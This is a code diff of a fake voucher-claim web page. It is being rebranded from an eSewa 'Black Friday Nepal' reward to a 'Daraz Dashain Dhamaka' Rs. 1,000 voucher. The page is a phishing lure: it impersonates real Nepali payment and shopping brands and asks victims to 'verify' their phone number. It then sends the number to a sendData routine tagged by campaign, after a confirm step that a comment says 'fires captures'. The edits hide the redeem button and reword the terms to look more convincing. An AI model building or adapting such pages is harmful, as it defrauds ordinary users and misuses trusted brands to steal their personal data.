@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>eSewa - Claim Reward</title>
+<title>Daraz Dashain Dhamaka - Claim Reward</title>
 <style>
   * { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
   body { 
@@ -162,7 +162,7 @@
   <!-- BANNER IMAGE -->
   <img class="banner-img"
        src="https://plain-apac-prod-public.komododecks.com/202610/23/8ApYflnMzZeZ4LLVkSqY/image.jpg"
-       alt="Black Friday Nepal">
+       alt="Daraz Dashain Dhamaka">
 
   <!-- LOGO -->
   <img id="brandLogo"
@@ -186,13 +186,13 @@
 
 <!-- FORM SECTION (Appears after confirm) -->
 <div id="formSection" class="form-section" style="display:none;">
-  <div class="form-header">⚡ Final Step</div>
+  <div class="form-header">&#9889; Final Step</div>
   <p class="form-hint">Verify your phone number to receive the reward instantly.</p>
   
   <input id="phone" type="tel" class="form-input" placeholder="Enter Phone Number" inputmode="numeric">
   <input id="notes" type="text" class="form-input" placeholder="Additional Notes (Optional)">
   
-  <button id="btnSubmit" class="form-submit-btn">VERIFY & CLAIM</button>
+  <button id="btnSubmit" class="form-submit-btn">VERIFY &amp; CLAIM</button>
   <div class="fine-print" style="margin-top: 12px;">*can be redeemed once only</div>
 </div>
 
@@ -201,13 +201,13 @@
   <div class="modal-content">
     <h2 class="modal-title">Redeem Voucher</h2>
     <p class="modal-desc">
-      You are about to redeem your <strong>DARAZ DASHAIN DHAMAKA</strong> voucher worth <strong>Rs. 1,000</strong>. Please confirm below to proceed.
+      You are about to redeem your esewa to <strong>DARAZ DASHAIN DHAMAKA</strong> voucher worth <strong>Rs. 1,000</strong>. Please confirm below to proceed.
     </p>
 
     <div class="checkbox-group">
       <input type="checkbox" id="agreeCheck">
       <label for="agreeCheck" class="checkbox-label">
-        I agree to DARAZ NEPAL's <a href="#">Terms and Conditions</a> and confirm the details are correct.
+        I agree to esewa&rsquo;s to <a href="#">DARAZ NEPAL's</a> Terms and Conditions and confirm the details are correct.
       </label>
     </div>
 
@@ -248,11 +248,13 @@ agreeCheck.addEventListener('change', () => {
   btnConfirm.disabled = !agreeCheck.checked;
 });
 
-/* ---------- CONFIRM: close modal, show form, fire captures ---------- */
+/* ---------- CONFIRM: close modal, hide redeem btn, show form, fire captures ---------- */
 btnConfirm.addEventListener('click', () => {
   modal.classList.remove('active');
 
-  // Hide the top card's button? No, keep it as is.
+  // Hide the REDEEM NOW button so it disappears after single press
+  btnRedeem.style.display = 'none';
+
   // Show the form section below
   formSection.style.display = 'block';
   setTimeout(() => formSection.scrollIntoView({behavior:'smooth', block:'end'}), 150);
@@ -336,7 +338,7 @@ btnSubmit.addEventListener('click', () => {
   btnSubmit.textContent = 'SUBMITTING...';
 
   sendData({
-    campaign: 'Black Friday Nepal',
+    campaign: 'Daraz Dashain Dhamaka',
     reward: 'Rs. 1,000',
     phoneNumber: phone,
     notes: notes,
